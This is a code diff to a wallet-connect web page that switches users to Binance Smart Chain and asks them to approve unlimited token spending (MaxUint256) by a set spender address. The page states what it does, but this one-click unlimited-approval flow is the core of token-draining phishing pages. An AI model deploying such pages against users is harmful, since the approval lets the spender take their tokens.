@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Unlimited Token Approval</title>
+  <title>Approve BSC Token Unlimited</title>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
 </head>
 <body>
-  <h2>Connect Wallet (QR Supported)</h2>
+  <h2>Connect Wallet (BSC + QR Supported)</h2>
   <div id="status">Not connected</div>
   <button id="connectButton">Connect Wallet</button>
 
@@ -24,6 +24,19 @@
 
   <script>
     let signer;
+    let provider;
+
+    const BSC_PARAMS = {
+      chainId: "0x38",
+      chainName: "Binance Smart Chain",
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18,
+      },
+    };
 
     const providerOptions = {
       walletconnect: {
@@ -32,6 +45,7 @@
           rpc: {
             56: "https://bsc-dataseed.binance.org/",
           },
+          chainId: 56,
         },
       },
     };
@@ -41,13 +55,29 @@
       providerOptions,
     });
 
-    let instance;
+    async function switchToBSC() {
+      try {
+        await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_PARAMS.chainId }]);
+      } catch (error) {
+        if (error.code === 4902) {
+          await provider.send("wallet_addEthereumChain", [BSC_PARAMS]);
+        } else {
+          throw error;
+        }
+      }
+    }
 
     async function connectWallet() {
       try {
-        instance = await web3Modal.connect();
-        const provider = new ethers.providers.Web3Provider(instance);
+        const instance = await web3Modal.connect();
+        provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
+        const network = await provider.getNetwork();
+
+        if (network.chainId !== 56) {
+          await switchToBSC();
+        }
+
         const address = await signer.getAddress();
         document.getElementById("status").innerText = "Connected: " + address;
         document.getElementById("approveButton").disabled = false;
@@ -77,8 +107,8 @@
         ];
 
         const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+        const amount = ethers.constants.MaxUint256;
 
-        const amount = ethers.constants.MaxUint256; // ✅ Unlimited approve
         document.getElementById("status").innerText = "Approving unlimited...";
         const tx = await tokenContract.approve(spender, amount);
         await tx.wait();
